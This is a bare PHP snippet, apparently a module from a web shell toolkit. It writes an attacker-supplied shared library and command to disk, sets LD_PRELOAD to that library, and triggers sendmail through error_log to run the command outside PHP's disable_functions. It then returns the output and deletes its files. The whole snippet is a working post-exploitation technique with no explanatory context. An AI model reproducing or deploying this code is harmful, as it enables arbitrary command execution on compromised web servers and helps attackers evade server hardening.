try {
    error_reporting(E_ALL);
    $result="NULL";
    $so=get("so");
    $soFile=get("soFile");
    $cmdFile=get("cmdFile");
    $resultFile=get("resultFile");
    $cmd=get("cmd");

    file_put_contents($soFile,$so);
    file_put_contents($cmdFile,$cmd);

    putenv("LD_PRELOAD=".$soFile);

    @error_log("a", 1);
    $result=file_get_contents($resultFile);
    if ($resultFile===false){
        $result="null";
    }
    @unlink($cmdFile);
    @unlink($soFile);
    @unlink($resultFile);
    echo $result;
}
catch(Exception $e) {
    echo "ERROR://".$e->getMessage();
}